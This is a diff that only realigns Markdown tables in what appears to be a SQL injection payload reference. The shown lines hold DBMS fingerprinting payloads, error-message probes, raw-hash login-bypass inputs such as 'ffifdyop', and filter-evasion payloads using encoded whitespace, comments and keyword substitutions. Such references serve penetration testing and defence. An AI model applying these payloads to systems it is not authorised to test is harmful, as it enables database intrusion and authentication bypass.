@@ -84,46 +84,46 @@ Detecting the entry point in SQL injection (SQLi) involves identifying locations
 
 Certain SQL keywords are specific to particular database management systems (DBMS). By using these keywords in SQL injection attempts and observing how the website responds, you can often determine the type of DBMS in use.
 
-| DBMS                | SQL Payload                     |
-| ------------------- | ------------------------------- |
-| MySQL               | `conv('a',16,2)=conv('a',16,2)` |
-| MySQL               | `connection_id()=connection_id()` |
-| MySQL               | `crc32('MySQL')=crc32('MySQL')` |
-| MSSQL               | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)` |
-| MSSQL               | `@@CONNECTIONS>0` |
-| MSSQL               | `@@CONNECTIONS=@@CONNECTIONS` |
-| MSSQL               | `@@CPU_BUSY=@@CPU_BUSY` |
-| MSSQL               | `USER_ID(1)=USER_ID(1)` |
-| ORACLE              | `ROWNUM=ROWNUM` |
-| ORACLE              | `RAWTOHEX('AB')=RAWTOHEX('AB')` |
-| ORACLE              | `LNNVL(0=123)` |
-| POSTGRESQL          | `5::int=5` |
-| POSTGRESQL          | `5::integer=5` |
-| POSTGRESQL          | `pg_client_encoding()=pg_client_encoding()` |
-| POSTGRESQL          | `get_current_ts_config()=get_current_ts_config()` |
-| POSTGRESQL          | `quote_literal(42.5)=quote_literal(42.5)` |
-| POSTGRESQL          | `current_database()=current_database()` |
-| SQLITE              | `sqlite_version()=sqlite_version()` |
-| SQLITE              | `last_insert_rowid()>1` |
-| SQLITE              | `last_insert_rowid()=last_insert_rowid()` |
-| MSACCESS            | `val(cvar(1))=1` |
-| MSACCESS            | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0` |
+| DBMS       | SQL Payload                                       |
+| ---------- | ------------------------------------------------- |
+| MySQL      | `conv('a',16,2)=conv('a',16,2)`                   |
+| MySQL      | `connection_id()=connection_id()`                 |
+| MySQL      | `crc32('MySQL')=crc32('MySQL')`                   |
+| MSSQL      | `BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)`       |
+| MSSQL      | `@@CONNECTIONS>0`                                 |
+| MSSQL      | `@@CONNECTIONS=@@CONNECTIONS`                     |
+| MSSQL      | `@@CPU_BUSY=@@CPU_BUSY`                           |
+| MSSQL      | `USER_ID(1)=USER_ID(1)`                           |
+| ORACLE     | `ROWNUM=ROWNUM`                                   |
+| ORACLE     | `RAWTOHEX('AB')=RAWTOHEX('AB')`                   |
+| ORACLE     | `LNNVL(0=123)`                                    |
+| POSTGRESQL | `5::int=5`                                        |
+| POSTGRESQL | `5::integer=5`                                    |
+| POSTGRESQL | `pg_client_encoding()=pg_client_encoding()`       |
+| POSTGRESQL | `get_current_ts_config()=get_current_ts_config()` |
+| POSTGRESQL | `quote_literal(42.5)=quote_literal(42.5)`         |
+| POSTGRESQL | `current_database()=current_database()`           |
+| SQLITE     | `sqlite_version()=sqlite_version()`               |
+| SQLITE     | `last_insert_rowid()>1`                           |
+| SQLITE     | `last_insert_rowid()=last_insert_rowid()`         |
+| MSACCESS   | `val(cvar(1))=1`                                  |
+| MSACCESS   | `IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0`               |
 
 ### DBMS Identification Error Based
 
 Different DBMSs return distinct error messages when they encounter issues. By triggering errors and examining the specific messages sent back by the database, you can often identify the type of DBMS the website is using.
 
-| DBMS                | Example Error Message                                                                    | Example Payload |
-| ------------------- | -----------------------------------------------------------------------------------------|-----------------|
-| MySQL               | `You have an error in your SQL syntax; ... near '' at line 1`                            | `'`             |
-| PostgreSQL          | `ERROR: unterminated quoted string at or near "'"`                                       | `'`             |
-| PostgreSQL          | `ERROR: syntax error at or near "1"`                                                     | `1'`            |
-| Microsoft SQL Server| `Unclosed quotation mark after the character string ''.`                                 | `'`             |
-| Microsoft SQL Server| `Incorrect syntax near ''.`                                                              | `'`             |
-| Microsoft SQL Server| `The conversion of the varchar value to data type int resulted in an out-of-range value.`| `1'`            |
-| Oracle              | `ORA-00933: SQL command not properly ended`                                              | `'`             |
-| Oracle              | `ORA-01756: quoted string not properly terminated`                                       | `'`             |
-| Oracle              | `ORA-00923: FROM keyword not found where expected`                                       | `1'`            |
+| DBMS                 | Example Error Message                                                                     | Example Payload |
+| -------------------- | ----------------------------------------------------------------------------------------- | --------------- |
+| MySQL                | `You have an error in your SQL syntax; ... near '' at line 1`                             | `'`             |
+| PostgreSQL           | `ERROR: unterminated quoted string at or near "'"`                                        | `'`             |
+| PostgreSQL           | `ERROR: syntax error at or near "1"`                                                      | `1'`            |
+| Microsoft SQL Server | `Unclosed quotation mark after the character string ''.`                                  | `'`             |
+| Microsoft SQL Server | `Incorrect syntax near ''.`                                                               | `'`             |
+| Microsoft SQL Server | `The conversion of the varchar value to data type int resulted in an out-of-range value.` | `1'`            |
+| Oracle               | `ORA-00933: SQL command not properly ended`                                               | `'`             |
+| Oracle               | `ORA-01756: quoted string not properly terminated`                                        | `'`             |
+| Oracle               | `ORA-00923: FROM keyword not found where expected`                                        | `1'`            |
 
 ## Authentication Bypass
 
@@ -170,13 +170,13 @@ sql = "SELECT * FROM admin WHERE pass = '".md5($password,true)."'";
 
 An attacker can craft a payload where the result of the `md5($password,true)` function will contain a quote and escape the SQL context, for example with `' or 'SOMETHING`.
 
-| Hash | Input    | Output (Raw)            |  Payload  |
-| ---- | -------- | ----------------------- | --------- |
-| md5  | ffifdyop | `'or'6�]��!r,��b`       | `'or'`    |
-| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8` | `'or'` |
-| sha1 | 3fDf     | `Q�u'='�@�[�t�- o��_-!` | `'='`     |
-| sha1 | 178374   | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`     |
-| sha1 | 17       | `Ùp2ûjww%6\`            | `\`       |
+| Hash | Input                                   | Output (Raw)            | Payload |
+| ---- | --------------------------------------- | ----------------------- | ------- |
+| md5  | ffifdyop                                | `'or'6�]��!r,��b`       | `'or'`  |
+| md5  | 129581926211651571912466741651878684928 | `ÚT0Do#ßÁ'or'8`         | `'or'`  |
+| sha1 | 3fDf                                    | `Q�u'='�@�[�t�- o��_-!` | `'='`   |
+| sha1 | 178374                                  | `ÜÛ¾}_ia!8Wm'/*´Õ`      | `'/*`   |
+| sha1 | 17                                      | `Ùp2ûjww%6\`            | `\`     |
 
 This behavior can be abused to bypass the authentication by escaping the context.
 
@@ -491,51 +491,51 @@ Some web applications attempt to secure their SQL queries by blocking or strippi
 
 Most databases interpret certain ASCII control characters and encoded spaces (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade space-based filters.
 
-| Example Payload               | Description                      |
-|-------------------------------|----------------------------------|
-| `?id=1%09and%091=1%09--`      | `%09` is tab (`\t`)              |
-| `?id=1%0Aand%0A1=1%0A--`      | `%0A` is line feed (`\n`)        |
-| `?id=1%0Band%0B1=1%0B--`      | `%0B` is vertical tab            |
-| `?id=1%0Cand%0C1=1%0C--`      | `%0C` is form feed               |
-| `?id=1%0Dand%0D1=1%0D--`      | `%0D` is carriage return (`\r`)  |
-| `?id=1%A0and%A01=1%A0--`      | `%A0` is non-breaking space      |
+| Example Payload          | Description                     |
+| ------------------------ | ------------------------------- |
+| `?id=1%09and%091=1%09--` | `%09` is tab (`\t`)             |
+| `?id=1%0Aand%0A1=1%0A--` | `%0A` is line feed (`\n`)       |
+| `?id=1%0Band%0B1=1%0B--` | `%0B` is vertical tab           |
+| `?id=1%0Cand%0C1=1%0C--` | `%0C` is form feed              |
+| `?id=1%0Dand%0D1=1%0D--` | `%0D` is carriage return (`\r`) |
+| `?id=1%A0and%A01=1%A0--` | `%A0` is non-breaking space     |
 
 **ASCII Whitespace Support by Database**:
 
-| DBMS         | Supported Whitespace Characters (Hex)            |
-|--------------|--------------------------------------------------|
-| SQLite3      | 0A, 0D, 0C, 09, 20                               |
-| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |
-| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
-| PostgreSQL   | 0A, 0D, 0C, 09, 20                               |
-| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |
-| MSSQL        | 01–1F, 20                                        |
+| DBMS       | Supported Whitespace Characters (Hex)             |
+| ---------- | ------------------------------------------------- |
+| SQLite3    | 0A, 0D, 0C, 09, 20                                |
+| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20                        |
+| MySQL 3    | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
+| PostgreSQL | 0A, 0D, 0C, 09, 20                                |
+| Oracle 11g | 00, 0A, 0D, 0C, 09, 20                            |
+| MSSQL      | 01–1F, 20                                         |
 
 #### Bypassing with Comments and Parentheses
 
 SQL allows comments and grouping, which can break up keywords and queries, thus defeating space filters:
 
-| Bypass                                    | Technique            |
-| ----------------------------------------- | -------------------- |
-| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment              |
-| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment  |
-| `?id=(1)and(1)=(1)--`                     | Parenthesis          |
+| Bypass                                    | Technique           |
+| ----------------------------------------- | ------------------- |
+| `?id=1/*comment*/AND/**/1=1/**/--`        | Comment             |
+| `?id=1/*!12345UNION*//*!12345SELECT*/1--` | Conditional comment |
+| `?id=(1)and(1)=(1)--`                     | Parenthesis         |
 
 ### No Comma Allowed
 
 Bypass using `OFFSET`, `FROM` and `JOIN`.
 
-| Forbidden           | Bypass |
-| ------------------- | ------ |
-| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0` |
-| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)` |
+| Forbidden           | Bypass                                                                               |
+| ------------------- | ------------------------------------------------------------------------------------ |
+| `LIMIT 0,1`         | `LIMIT 1 OFFSET 0`                                                                   |
+| `SUBSTR('SQL',1,1)` | `SUBSTR('SQL' FROM 1 FOR 1)`                                                         |
 | `SELECT 1,2,3,4`    | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d` |
 
 ### No Equal Allowed
 
 Bypass using LIKE/NOT IN/IN/BETWEEN
 
-| Bypass    | SQL Example |
+| Bypass    | SQL Example                                |
 | --------- | ------------------------------------------ |
 | `LIKE`    | `SUBSTRING(VERSION(),1,1)LIKE(5)`          |
 | `NOT IN`  | `SUBSTRING(VERSION(),1,1)NOT IN(4,3)`      |
@@ -546,11 +546,11 @@ Bypass using LIKE/NOT IN/IN/BETWEEN
 
 Bypass using uppercase/lowercase.
 
-| Bypass    | Technique  |
-| --------- | ---------- |
-| `AND`     | Uppercase  |
-| `and`     | Lowercase  |
-| `aNd`     | Mixed case |
+| Bypass | Technique  |
+| ------ | ---------- |
+| `AND`  | Uppercase  |
+| `and`  | Lowercase  |
+| `aNd`  | Mixed case |
 
 Bypass using keywords case insensitive or an equivalent operator.
 
